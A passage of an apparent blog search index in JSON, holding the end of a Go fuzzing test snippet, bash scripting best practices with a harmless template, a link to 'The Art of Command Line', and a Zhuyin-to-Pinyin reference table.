{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNew\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresult\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e); \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eErrOverflow\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \t\t\u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEqual\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eresult\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresult\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e); \u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e \u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e \u0026gt; \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eErrOverflow\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \t\t\u003cspan style=\"color:#a6e22e\"\u003eresultDivX\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ePow\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ey\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \t\t\u003cspan style=\"color:#a6e22e\"\u003eassert\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEqual\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eresult\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ex\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eresultDivX\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  })\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go","Testing"],"title":"善用 Go Fuzzing，幫助你寫出更完整的單元測試"},{"categories":["URL","SHELL","Linux"],"contents":" Shell Script Best Practices Things Just make the first line be #!/usr/bin/env bash. Use the .sh (or .bash) extension for your file. Use set -o errexit at the start of your script. Prefer to use set -o nounset. use \u0026quot;${VARNAME-}\u0026quot; instead of \u0026quot;$VARNAME\u0026quot; Use set -o pipefail. Use set -o xtrace, with a check on $TRACE env variable. if [[ \u0026quot;${TRACE-0}\u0026quot; == \u0026quot;1\u0026quot; ]]; then set -o xtrace; fi People can now enable debug mode, by running your script as TRACE=1 ./script.sh instead of ./script.sh. Use [[ ]] for conditions in if / while statements, instead of [ ] or test. Always quote variable accesses with double-quotes. Use local variables in functions. When printing error messages, please redirect to stderr. Use echo 'Something unexpected happened' \u0026gt;\u0026amp;2 for this. Use long options, where possible (like --silent instead of -s). If appropriate, change to the script\u0026rsquo;s directory close to the start of the script. Use cd \u0026ldquo;$(dirname \u0026ldquo;$0\u0026rdquo;)\u0026rdquo;, which works in most cases. Use shellcheck. Heed its warnings. Template #!/usr/bin/env bash set -o errexit set -o nounset set -o pipefail if [[ \u0026#34;${TRACE-0}\u0026#34; == \u0026#34;1\u0026#34; ]]; then set -o xtrace fi if [[ \u0026#34;${1-}\u0026#34; =~ ^-*h(elp)?$ ]]; then echo \u0026#39;Usage: ./script.sh arg-one arg-two This is an awesome bash script to make your life better. \u0026#39; exit fi cd \u0026#34;$(dirname \u0026#34;$0\u0026#34;)\u0026#34; main() { echo do awesome stuff } main \u0026#34;$@\u0026#34; ","date":"November 3, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221103-shell-script-best-practices/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://sharats.me/posts/shell-script-best-practices/\" target=\"_blank\" rel=\"noopener\"\u003eShell Script Best Practices\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"things\"\u003eThings\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003eJust make the first line be \u003ccode\u003e#!/usr/bin/env bash\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eUse the \u003ccode\u003e.sh\u003c/code\u003e (or \u003ccode\u003e.bash\u003c/code\u003e) extension for your file.\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003eset -o errexit\u003c/code\u003e at the start of your script.\u003c/li\u003e\n\u003cli\u003ePrefer to use \u003ccode\u003eset -o nounset\u003c/code\u003e.\n\u003col\u003e\n\u003cli\u003euse \u003ccode\u003e\u0026quot;${VARNAME-}\u0026quot;\u003c/code\u003e instead of \u003ccode\u003e\u0026quot;$VARNAME\u0026quot;\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003eset -o pipefail\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003eset -o xtrace\u003c/code\u003e, with a check on \u003ccode\u003e$TRACE\u003c/code\u003e env variable.\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eif [[ \u0026quot;${TRACE-0}\u0026quot; == \u0026quot;1\u0026quot; ]]; then set -o xtrace; fi\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003ePeople can now enable debug mode, by running your script as \u003ccode\u003eTRACE=1 ./script.sh\u003c/code\u003e instead of \u003ccode\u003e./script.sh\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003e[[ ]]\u003c/code\u003e for conditions in \u003ccode\u003eif\u003c/code\u003e / \u003ccode\u003ewhile\u003c/code\u003e statements, instead of \u003ccode\u003e[ ]\u003c/code\u003e or \u003ccode\u003etest\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eAlways quote variable accesses with double-quotes.\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003elocal\u003c/code\u003e variables in functions.\u003c/li\u003e\n\u003cli\u003eWhen printing error messages, please redirect to stderr.\n\u003col\u003e\n\u003cli\u003eUse \u003ccode\u003eecho 'Something unexpected happened' \u0026gt;\u0026amp;2\u003c/code\u003e for this.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eUse long options, where possible (like \u003ccode\u003e--silent\u003c/code\u003e instead of \u003ccode\u003e-s\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eIf appropriate, change to the script\u0026rsquo;s directory close to the start of the script.\n\u003col\u003e\n\u003cli\u003eUse cd \u0026ldquo;$(dirname \u0026ldquo;$0\u0026rdquo;)\u0026rdquo;, which works in most cases.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003eshellcheck\u003c/code\u003e. Heed its warnings.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch4 id=\"template\"\u003eTemplate\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/usr/bin/env bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset -o errexit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset -o nounset\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset -o pipefail\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[[\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eTRACE-0\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    set -o xtrace\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[[\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003e1-\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e~ ^-*h\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eelp\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e?$ \u003cspan style=\"color:#f92672\"\u003e]]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Usage: ./script.sh arg-one arg-two\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eThis is an awesome bash script to make your life better.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    exit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecd \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003edirname \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$0\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emain\u003cspan style=\"color:#f92672\"\u003e()\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e awesome stuff\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emain \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$@\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","SHELL","Linux"],"title":"Shell Script Best Practices"},{"categories":["URL","SHELL","Linux"],"contents":" The Art of Command Line ","date":"November 2, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221102-the-art-of-command-line/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/jlevy/the-art-of-command-line\" target=\"_blank\" rel=\"noopener\"\u003eThe Art of Command Line\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","SHELL","Linux"],"title":"The Art of Command Line"},{"categories":["URL","pinyin"],"contents":" 一張圖學會【拼音輸入法】 聲母（Initials） 聲母 拼音 例字 ㄅ b 爸 ba、別 bie、奔 ben ㄆ p 撇 pie、平 ping、鵬 peng ㄇ m 媽 ma、莫 mo、某 mou ㄈ f 發 fa、飯 fan、風 feng ㄉ d 的 d、但 dan、段 duan ㄊ t 他 ta、貼 tie、團 tuan ㄋ n 你 ni、農 nong、暖 nuan ㄌ l 李 li、亂 luan、亮 liang ㄍ g 跟 gen、怪 guai、灌 guan ㄎ k 快 kuai、考 kao、狂 kuang ㄏ h 哈 ha、漢 han、橫 heng ㄐ j 叫 jiao、雞 ji、京 jing ㄑ q 七 qi、琴 qin、巧 qiao ㄒ x 西 xi、寫 xie、小 xiao ㄓ zh 知 zhi、戰 zhan、正 zheng ㄔ ch 吃 chi、船 chuan、重 chong ㄕ sh 是 shi、山 shan、刷 shuan ㄖ r 日 ri、讓 rang、人 ren ㄗ z 字 zi、讚 zan、昨 zuo ㄘ c 次 ci、菜 cai、餐 can ㄙ s 三 san、四 si、算 suan 介音 / 特殊聲母 類型 拼音 例字 y yi / i 以 yi、依 yi、修 xiu w wu / u 無 wu、溫 wen、船 chuan v yu / ü 律 lü、雨 yu、院 yuan 單韻母（Finals） 韻母 拼音 例字 ㄚ a 沙 sha、撒 sa、奧 ao ㄛ o 哦 o、偶 ou、歐 ou ㄜ e 餓 e、樂 le、設 she ㄝ ê / ye 也 ye、學 xue、切 qie ㄞ ai 愛 ai、篩 shai、崖 yai ㄟ ei 雷 lei、最 zui、脆 cui ㄠ ao 凹 ao、老 lao、笑 xiao ㄡ ou 歐 ou、樓 lou、手 shou ㄢ an 安 an、蘭 lan、算 suan ㄣ en 恩 en、林 lin、冷 leng ㄤ ang 昂 ang、浪 lang、讓 rang ㄥ eng 成 cheng、冷 leng、令 ling ㄦ er 二 er、兒 er、而 er 複韻母 / 組合韻 拼音 例字 ye 也 ye、結 jie、血 xie iu 六 liu、有 you、謬 miu in 音 yin、新 xin、林 lin ing 英 ying、靈 ling、醒 xing uan 元 yuan、卷 juan、團 tuan ue 略 lue、學 xue yun 雲 yun、巡 xun、群 qun ong 用 yong、兇 xiong、同 tong ui 鬼 gui、為 wei、虧 kui un 文 wen、混 hun、準 zhun ua 華 hua、抓 zhua、蛙 wa uai 壞 huai、快 kuai、踹 chuai ","date":"October 25, 2022","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20221025-zhuyin-pinyin/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://briian.com/zhuyin-pinyin\" target=\"_blank\" rel=\"noopener\"\u003e一張圖學會【拼音輸入法】\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"聲母initials\"\u003e聲母（Initials）\u003c/h5\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e聲母\u003c/th\u003e\n          \u003cth\u003e拼音\u003c/th\u003e\n          \u003cth\u003e例字\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄅ\u003c/td\u003e\n          \u003ctd\u003eb\u003c/td\u003e\n          \u003ctd\u003e爸 ba、別 bie、奔 ben\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄆ\u003c/td\u003e\n          \u003ctd\u003ep\u003c/td\u003e\n          \u003ctd\u003e撇 pie、平 ping、鵬 peng\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄇ\u003c/td\u003e\n          \u003ctd\u003em\u003c/td\u003e\n          \u003ctd\u003e媽 ma、莫 mo、某 mou\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄈ\u003c/td\u003e\n          \u003ctd\u003ef\u003c/td\u003e\n          \u003ctd\u003e發 fa、飯 fan、風 feng\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄉ\u003c/td\u003e\n          \u003ctd\u003ed\u003c/td\u003e\n          \u003ctd\u003e的 d、但 dan、段 duan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄊ\u003c/td\u003e\n          \u003ctd\u003et\u003c/td\u003e\n          \u003ctd\u003e他 ta、貼 tie、團 tuan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄋ\u003c/td\u003e\n          \u003ctd\u003en\u003c/td\u003e\n          \u003ctd\u003e你 ni、農 nong、暖 nuan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄌ\u003c/td\u003e\n          \u003ctd\u003el\u003c/td\u003e\n          \u003ctd\u003e李 li、亂 luan、亮 liang\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄍ\u003c/td\u003e\n          \u003ctd\u003eg\u003c/td\u003e\n          \u003ctd\u003e跟 gen、怪 guai、灌 guan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄎ\u003c/td\u003e\n          \u003ctd\u003ek\u003c/td\u003e\n          \u003ctd\u003e快 kuai、考 kao、狂 kuang\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄏ\u003c/td\u003e\n          \u003ctd\u003eh\u003c/td\u003e\n          \u003ctd\u003e哈 ha、漢 han、橫 heng\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄐ\u003c/td\u003e\n          \u003ctd\u003ej\u003c/td\u003e\n          \u003ctd\u003e叫 jiao、雞 ji、京 jing\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄑ\u003c/td\u003e\n          \u003ctd\u003eq\u003c/td\u003e\n          \u003ctd\u003e七 qi、琴 qin、巧 qiao\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄒ\u003c/td\u003e\n          \u003ctd\u003ex\u003c/td\u003e\n          \u003ctd\u003e西 xi、寫 xie、小 xiao\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄓ\u003c/td\u003e\n          \u003ctd\u003ezh\u003c/td\u003e\n          \u003ctd\u003e知 zhi、戰 zhan、正 zheng\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄔ\u003c/td\u003e\n          \u003ctd\u003ech\u003c/td\u003e\n          \u003ctd\u003e吃 chi、船 chuan、重 chong\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄕ\u003c/td\u003e\n          \u003ctd\u003esh\u003c/td\u003e\n          \u003ctd\u003e是 shi、山 shan、刷 shuan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄖ\u003c/td\u003e\n          \u003ctd\u003er\u003c/td\u003e\n          \u003ctd\u003e日 ri、讓 rang、人 ren\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄗ\u003c/td\u003e\n          \u003ctd\u003ez\u003c/td\u003e\n          \u003ctd\u003e字 zi、讚 zan、昨 zuo\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄘ\u003c/td\u003e\n          \u003ctd\u003ec\u003c/td\u003e\n          \u003ctd\u003e次 ci、菜 cai、餐 can\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄙ\u003c/td\u003e\n          \u003ctd\u003es\u003c/td\u003e\n          \u003ctd\u003e三 san、四 si、算 suan\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch5 id=\"介音--特殊聲母\"\u003e介音 / 特殊聲母\u003c/h5\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e類型\u003c/th\u003e\n          \u003cth\u003e拼音\u003c/th\u003e\n          \u003cth\u003e例字\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ey\u003c/td\u003e\n          \u003ctd\u003eyi / i\u003c/td\u003e\n          \u003ctd\u003e以 yi、依 yi、修 xiu\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ew\u003c/td\u003e\n          \u003ctd\u003ewu / u\u003c/td\u003e\n          \u003ctd\u003e無 wu、溫 wen、船 chuan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003ev\u003c/td\u003e\n          \u003ctd\u003eyu / ü\u003c/td\u003e\n          \u003ctd\u003e律 lü、雨 yu、院 yuan\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch5 id=\"單韻母finals\"\u003e單韻母（Finals）\u003c/h5\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e韻母\u003c/th\u003e\n          \u003cth\u003e拼音\u003c/th\u003e\n          \u003cth\u003e例字\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄚ\u003c/td\u003e\n          \u003ctd\u003ea\u003c/td\u003e\n          \u003ctd\u003e沙 sha、撒 sa、奧 ao\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄛ\u003c/td\u003e\n          \u003ctd\u003eo\u003c/td\u003e\n          \u003ctd\u003e哦 o、偶 ou、歐 ou\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄜ\u003c/td\u003e\n          \u003ctd\u003ee\u003c/td\u003e\n          \u003ctd\u003e餓 e、樂 le、設 she\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄝ\u003c/td\u003e\n          \u003ctd\u003eê / ye\u003c/td\u003e\n          \u003ctd\u003e也 ye、學 xue、切 qie\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄞ\u003c/td\u003e\n          \u003ctd\u003eai\u003c/td\u003e\n          \u003ctd\u003e愛 ai、篩 shai、崖 yai\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄟ\u003c/td\u003e\n          \u003ctd\u003eei\u003c/td\u003e\n          \u003ctd\u003e雷 lei、最 zui、脆 cui\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄠ\u003c/td\u003e\n          \u003ctd\u003eao\u003c/td\u003e\n          \u003ctd\u003e凹 ao、老 lao、笑 xiao\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄡ\u003c/td\u003e\n          \u003ctd\u003eou\u003c/td\u003e\n          \u003ctd\u003e歐 ou、樓 lou、手 shou\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄢ\u003c/td\u003e\n          \u003ctd\u003ean\u003c/td\u003e\n          \u003ctd\u003e安 an、蘭 lan、算 suan\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄣ\u003c/td\u003e\n          \u003ctd\u003een\u003c/td\u003e\n          \u003ctd\u003e恩 en、林 lin、冷 leng\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄤ\u003c/td\u003e\n          \u003ctd\u003eang\u003c/td\u003e\n          \u003ctd\u003e昂 ang、浪 lang、讓 rang\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄥ\u003c/td\u003e\n          \u003ctd\u003eeng\u003c/td\u003e\n          \u003ctd\u003e成 cheng、冷 leng、令 ling\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eㄦ\u003c/td\u003e\n          \u003ctd\u003eer\u003c/td\u003e\n          \u003ctd\u003e二 er、兒 er、而 er\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch5 id=\"複韻母--組合韻\"\u003e複韻母 / 組合韻\u003c/h5\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e拼音\u003c/th\u003e\n          \u003cth\u003e例字\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eye\u003c/td\u003e\n          \u003ctd\u003e也 ye、結 jie、血 xie\u003c/td\u003e\n      